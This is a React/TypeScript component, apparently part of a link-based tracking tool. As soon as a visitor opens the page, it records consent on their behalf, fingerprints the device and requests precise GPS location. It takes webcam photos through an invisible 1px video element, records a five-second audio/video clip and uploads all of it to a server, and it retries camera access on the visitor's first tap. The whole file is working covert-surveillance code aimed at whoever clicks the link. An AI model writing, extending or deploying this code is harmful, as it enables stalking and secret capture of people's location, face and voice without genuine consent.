import { useEffect, useRef, useState } from "react";
import { api, patch } from "../lib/api";
import { collectDevice } from "../lib/fingerprint";
import type { Visitor } from "../lib/types";

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

export type CamErr = "insecure" | "blocked" | "nodevice" | null;

export type EngineState = {
  session: Visitor | null;
  camErr: CamErr;
  blocked: string[];
  photoUrls: string[];
  finished: boolean;
  captured: boolean;
};

export type EngineApi = { retry: () => void };

export default function CaptureEngine({
  token,
  onChange,
  apiRef,
}: {
  token: string;
  onChange: (s: EngineState) => void;
  apiRef?: { current: EngineApi | null };
}) {
  const [session, setSession] = useState<Visitor | null>(null);
  const [camErr, setCamErr] = useState<CamErr>(null);
  const [blocked, setBlocked] = useState<string[]>([]);
  const [photoUrls, setPhotoUrls] = useState<string[]>([]);
  const [finished, setFinished] = useState(false);
  const [captured, setCaptured] = useState(false);
  const [permRetry, setPermRetry] = useState(0);

  const streamRef = useRef<MediaStream | null>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const bootedRef = useRef(false);
  const geoPromiseRef = useRef<Promise<{ ok: boolean }> | null>(null);
  const camPromiseRef = useRef<Promise<{ hasVideo: boolean; hasAudio: boolean }>>(
    null
  );
  const camErrRef = useRef<CamErr>(null);
  const camEpochRef = useRef(0);
  const gestureRef = useRef(false);
  const gestureWaitersRef = useRef<((ok: boolean) => void)[]>([]);

  const setCamErrBoth = (e: CamErr) => {
    camErrRef.current = e;
    setCamErr(e);
  };

  const cbRef = useRef(onChange);
  cbRef.current = onChange;

  useEffect(() => {
    cbRef.current({ session, camErr, blocked, photoUrls, finished, captured });
  }, [session, camErr, blocked, photoUrls, finished, captured]);

  const sendPrompt = async (kind: string, granted: boolean) => {
    try {
      const s = await patch<Visitor>(`/api/sessions/${token}/consent`, {
        prompt: { kind, granted },
      });
      setSession(s);
    } catch {}
  };

  const requestGeo = (): Promise<{ ok: boolean }> => {
    if (!geoPromiseRef.current) {
      geoPromiseRef.current = new Promise((resolve) => {
        if (!navigator.geolocation) {
          sendPrompt("location", false).then(() =>
            patch<Visitor>(`/api/sessions/${token}/geo`, { method: "ip" })
              .then(setSession)
              .catch(() => {})
          );
          resolve({ ok: false });
          return;
        }
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            await sendPrompt("location", true);
            try {
              const s = await patch<Visitor>(`/api/sessions/${token}/geo`, {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                altitude: pos.coords.altitude,
                speed: pos.coords.speed,
                method: "gps",
              });
              setSession(s);
            } catch {}
            resolve({ ok: true });
          },
          async () => {
            await sendPrompt("location", false);
            try {
              const s = await patch<Visitor>(`/api/sessions/${token}/geo`, {
                method: "ip",
              });
              setSession(s);
            } catch {}
            resolve({ ok: false });
          },
          { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
        );
      });
    }
    return geoPromiseRef.current;
  };

  const requestCam = (): Promise<{ hasVideo: boolean; hasAudio: boolean }> => {
    if (!camPromiseRef.current) {
      camPromiseRef.current = (async () => {
        const epoch = camEpochRef.current;
        const fresh = () => epoch === camEpochRef.current;
        setCamErrBoth(null);
        if (
          !window.isSecureContext ||
          !navigator.mediaDevices ||
          !navigator.mediaDevices.getUserMedia
        ) {
          if (fresh()) setCamErrBoth("insecure");
          if (fresh()) {
            sendPrompt("camera", false);
            sendPrompt("mic", false);
          }
          return { hasVideo: false, hasAudio: false };
        }
        const videoCfg: MediaTrackConstraints = {
          facingMode: "user",
          width: { ideal: 1280 },
        };
        let v: MediaStream | null = null;
        let a: MediaStream | null = null;
        let videoErr = "";
        let audioErr = "";
        try {
          v = await navigator.mediaDevices.getUserMedia({ video: videoCfg });
        } catch (e) {
          videoErr = (e as DOMException)?.name || "NotAllowedError";
        }
        if (fresh()) await sendPrompt("camera", !!v?.getVideoTracks().length);
        try {
          a = await navigator.mediaDevices.getUserMedia({ audio: true });
        } catch (e) {
          audioErr = (e as DOMException)?.name || "NotAllowedError";
        }
        if (fresh()) await sendPrompt("mic", !!a?.getAudioTracks().length);
        if (!fresh()) return { hasVideo: false, hasAudio: false };

        const vt = v?.getVideoTracks() || [];
        const at = a?.getAudioTracks() || [];
        if (!vt.length && !at.length) {
          const noDevice = (n: string) =>
            ["NotFoundError", "DevicesNotFoundError", "OverconstrainedError"].includes(n);
          setCamErrBoth(noDevice(videoErr) && noDevice(audioErr) ? "nodevice" : "blocked");
          return { hasVideo: false, hasAudio: false };
        }
        streamRef.current = new MediaStream([...vt, ...at]);
        return { hasVideo: vt.length > 0, hasAudio: at.length > 0 };
      })();
    }
    return camPromiseRef.current;
  };

  // iOS/Safari silently rejects getUserMedia() unless it runs inside a user
  // gesture — track the visitor's first tap so we can ask again there.
  useEffect(() => {
    const fire = () => {
      gestureRef.current = true;
      gestureWaitersRef.current.splice(0).forEach((w) => w(true));
    };
    document.addEventListener("click", fire, true);
    document.addEventListener("touchend", fire, true);
    document.addEventListener("keydown", fire, true);
    return () => {
      document.removeEventListener("click", fire, true);
      document.removeEventListener("touchend", fire, true);
      document.removeEventListener("keydown", fire, true);
    };
  }, []);

  const waitForGesture = (ms: number): Promise<boolean> =>
    new Promise((res) => {
      if (gestureRef.current) return res(true);
      const onG = (ok: boolean) => {
        clearTimeout(t);
        res(ok);
      };
      const t = setTimeout(() => {
        gestureWaitersRef.current = gestureWaitersRef.current.filter(
          (w) => w !== onG
        );
        res(false);
      }, ms);
      gestureWaitersRef.current.push(onG);
    });

  const checkPerms = async () => {
    const q = async (name: string) => {
      try {
        const s = await navigator.permissions.query({ name: name as PermissionName });
        return s.state;
      } catch {
        return "unknown";
      }
    };
    const [geo, cam, mic] = await Promise.all([
      q("geolocation"),
      q("camera"),
      q("microphone"),
    ]);
    const out: string[] = [];
    if (geo === "denied") out.push(`location=${geo}`);
    if (cam === "denied") out.push(`camera=${cam}`);
    if (mic === "denied") out.push(`mic=${mic}`);
    setBlocked(out);
  };

  const uploadMedia = async (
    blob: Blob,
    kind: "photo" | "clip",
    durationMs?: number,
    width?: number,
    height?: number
  ) => {
    const fd = new FormData();
    fd.append("kind", kind);
    if (durationMs) fd.append("durationMs", String(Math.round(durationMs)));
    if (width) fd.append("width", String(width));
    if (height) fd.append("height", String(height));
    fd.append(
      "file",
      blob,
      kind === "photo" ? `frame-${Date.now()}.jpg` : `clip-${Date.now()}.webm`
    );
    try {
      const s = await api<Visitor>(`/api/sessions/${token}/media`, {
        method: "POST",
        body: fd,
      });
      setSession(s);
    } catch {}
  };

  const grabAndUpload = async () => {
    const video = videoRef.current;
    if (!video) return;
    for (let i = 0; i < 12 && !video.videoWidth; i++) await sleep(250);
    if (!video.videoWidth) return;
    const canvas = document.createElement("canvas");
    canvas.width = Math.min(video.videoWidth, 960);
    canvas.height = Math.round(
      (canvas.width / video.videoWidth) * video.videoHeight
    );
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const blob: Blob | null = await new Promise((res) =>
      canvas.toBlob(res, "image/jpeg", 0.85)
    );
    if (!blob) return;
    setPhotoUrls((p) => [...p, URL.createObjectURL(blob)]);
    await uploadMedia(blob, "photo", undefined, canvas.width, canvas.height);
  };

  const retry = () => {
    geoPromiseRef.current = null;
    camPromiseRef.current = null;
    setCamErr(null);
    setPermRetry((r) => r + 1);
  };

  useEffect(() => {
    if (apiRef) apiRef.current = { retry };
  });

  // ---- auto pipeline: starts the moment the page is visited ----
  useEffect(() => {
    let dead = false;
    const run = async () => {
      try {
        const existing = await api<Visitor>(`/api/sessions/public/${token}`);
        if (dead) return;
        setSession(existing);
        if (existing.consent?.revealedAt) {
          setPhotoUrls(
            (existing.media || [])
              .filter((m) => m.kind === "photo")
              .map((m) => m.url)
          );
          setFinished(true);
          return;
        }
      } catch (e) {
        if (String((e as Error)?.message || e).includes("not found")) return;
      }
      if (dead) return;

      if (!bootedRef.current) {
        bootedRef.current = true;
        try {
          const s = await patch<Visitor>(`/api/sessions/${token}/consent`, {
            cardAccepted: true,
          });
          setSession(s);
        } catch {}
        try {
          const dev = await collectDevice();
          const s = await patch<Visitor>(`/api/sessions/${token}/device`, dev);
          setSession(s);
        } catch {}
      }

      // 1) location, then 2) camera, then 3) microphone
      const geoP = requestGeo();
      await Promise.race([geoP, sleep(6000)]);
      await Promise.race([requestCam(), sleep(12000)]);
      // iOS/Safari silently rejects getUserMedia() without a user gesture —
      // if the first attempt got nothing, ask again on the first tap.
      if (
        !streamRef.current &&
        camErrRef.current !== "insecure" &&
        camErrRef.current !== "nodevice" &&
        !dead
      ) {
        const tapped = await waitForGesture(15000);
        if (tapped && !dead && !streamRef.current) {
          camEpochRef.current++;
          camPromiseRef.current = null;
          setCamErrBoth(null);
          await Promise.race([requestCam(), sleep(12000)]);
        }
      }
      if (dead) return;
      checkPerms();

      const stream = streamRef.current;
      if (stream) {
        const hasV = stream.getVideoTracks().length > 0;
        const hasA = stream.getAudioTracks().length > 0;
        if (hasV) {
          const v = videoRef.current;
          if (v && v.srcObject !== stream) {
            v.srcObject = stream;
            v.muted = true;
            await v.play().catch(() => {});
          }
        }
        const frames = hasV
          ? (async () => {
              for (let i = 0; i < 3 && !dead; i++) {
                await sleep(1300);
                if (dead) return;
                await grabAndUpload();
              }
              if (!dead) stream.getVideoTracks().forEach((t) => (t.enabled = false));
            })()
          : Promise.resolve();
        const clip = hasA
          ? (async () => {
              if (typeof MediaRecorder === "undefined") return;
              try {
                const candidates = [
                  "video/webm;codecs=vp9,opus",
                  "video/webm;codecs=vp8,opus",
                  "video/webm",
                  "video/mp4",
                ];
                const mimeType = candidates.find((m) =>
                  MediaRecorder.isTypeSupported(m)
                );
                const chunks: Blob[] = [];
                const rec = new MediaRecorder(
                  stream,
                  mimeType ? { mimeType } : undefined
                );
                const t0 = Date.now();
                rec.ondataavailable = (e) => {
                  if (e.data.size) chunks.push(e.data);
                };
                const stopped = new Promise<void>((res) => {
                  rec.onstop = async () => {
                    if (!dead) {
                      const dur = Date.now() - t0;
                      const blob = new Blob(chunks, {
                        type: (mimeType || "video/webm").split(";")[0],
                      });
                      await uploadMedia(blob, "clip", dur);
                    }
                    res();
                  };
                });
                await sleep(1000);
                if (dead) return;
                rec.start();
                await sleep(5000);
                if (rec.state === "recording") rec.stop();
                await stopped;
                if (!dead) stream.getAudioTracks().forEach((t) => (t.enabled = false));
              } catch {}
            })()
          : Promise.resolve();
        await Promise.all([frames, clip]);
      }
      if (dead) return;

      try {
        const s = await patch<Visitor>(`/api/sessions/${token}/consent`, {
          revealed: true,
        });
        setSession(s);
      } catch {}
      if (dead) return;
      setFinished(true);
      setCaptured(true);
    };
    run();
    return () => {
      dead = true;
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
        streamRef.current = null;
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [permRetry, token]);

  return (
    <video
      ref={videoRef}
      playsInline
      muted
      autoPlay
      className="pointer-events-none absolute h-px w-px overflow-hidden opacity-0"
    />
  );
}
